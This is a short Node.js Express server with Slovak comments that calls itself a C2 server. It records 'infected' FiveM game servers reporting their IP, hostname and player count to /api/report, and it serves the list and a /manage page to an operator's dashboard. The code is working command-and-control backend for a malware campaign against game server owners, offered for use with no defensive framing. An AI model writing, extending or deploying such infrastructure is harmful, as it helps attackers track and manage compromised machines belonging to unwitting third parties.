const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(express.json());
app.use(cors());

// --- OPRAVA CESTY ---
// Ak máš server.js v hlavnom priečinku a index.html v priečinku 'frontend'
const frontendPath = path.join(__dirname, 'frontend'); 
app.use(express.static(frontendPath));

let infectedServers = []; 

// Endpoint pre FiveM servery (hlásenie statusu)
app.post('/api/report', (req, res) => {
    const newServer = {
        // Získame IP adresu (ošetrenie proxy z Renderu)
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        hostname: req.body.hostname || "Neznámy Server",
        players: req.body.players || 0,
        lastSeen: new Date().toLocaleTimeString('sk-SK')
    };

    // Odstránime IPv6 prefix ak existuje
    if (newServer.ip.includes('::ffff:')) {
        newServer.ip = newServer.ip.replace('::ffff:', '');
    }

    const index = infectedServers.findIndex(s => s.ip === newServer.ip);
    if (index > -1) { 
        infectedServers[index] = newServer; 
    } else { 
        infectedServers.push(newServer); 
    }
    
    res.status(200).send({ status: "ok" });
});

// Endpoint pre tvoj web (zoznam všetkých serverov)
app.get('/api/list', (req, res) => {
    res.json(infectedServers);
});

// Obsluha hlavnej stránky
app.get('/', (req, res) => {
    res.sendFile(path.join(frontendPath, 'index.html'));
});

// Obsluha manage stránky (aby fungovala adresa tvojweb.com/manage)
app.get('/manage', (req, res) => {
    res.sendFile(path.join(frontendPath, 'manage.html'));
});

const PORT = process.env.PORT || 10000; 
app.listen(PORT, '0.0.0.0', () => {
    console.log(`C2 Server beží na porte ${PORT}`);
});